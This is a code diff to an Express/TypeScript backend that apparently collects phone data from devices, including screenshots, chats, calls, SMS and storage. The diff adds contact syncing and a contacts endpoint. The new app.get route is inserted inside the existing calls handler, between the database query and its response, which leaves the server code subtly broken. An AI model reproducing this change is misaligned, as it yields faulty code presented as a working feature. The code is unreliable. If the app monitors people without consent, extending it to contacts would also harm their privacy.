@@ -12,6 +12,7 @@ import { screenshotSyncRouter } from "./routes/screenshotSync.js";
 import { chatSyncRouter } from "./routes/chatSync.js";
 import { callSyncRouter } from "./routes/callSync.js";
 import { smsSyncRouter } from "./routes/smsSync.js";
+import { contactSyncRouter } from "./routes/contactSync.js";
 import { appUpdateRouter } from "./routes/appUpdate.js";
 import { createSessionToken, parseCookies, verifyPassword, verifySessionToken, issueWalletChallenge, consumeWalletChallenge, verifyWalletSignature } from "./auth.js";
 
@@ -102,6 +103,7 @@ app.use(screenshotSyncRouter);
 app.use(chatSyncRouter);
 app.use(callSyncRouter);
 app.use(smsSyncRouter);
+app.use(contactSyncRouter);
 app.use(appUpdateRouter);
 app.use("/api", appUpdateRouter);
 
@@ -111,6 +113,7 @@ app.use("/api", storageSyncRouter);
 app.use("/api", screenshotSyncRouter);
 app.use("/api", chatSyncRouter);
 app.use("/api", callSyncRouter);
+app.use("/api", contactSyncRouter);
 
 
 /* ─────────────────── Wallet (MetaMask) authentication ──────────────────────
@@ -502,6 +505,16 @@ app.get("/api/devices/:deviceId/calls", requireAuth, async (req, res) => {
     where,
     orderBy: { callAt: "desc" },
     take: 500,
+  });
+
+  app.get("/api/devices/:deviceId/contacts", requireAuth, async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const contacts = await prisma.contact.findMany({
+      where: { deviceId },
+      orderBy: { receivedAt: "desc" },
+      take: 2000,
+    });
+    res.json(contacts);
   });
   res.json(
     rows.map((r) => ({
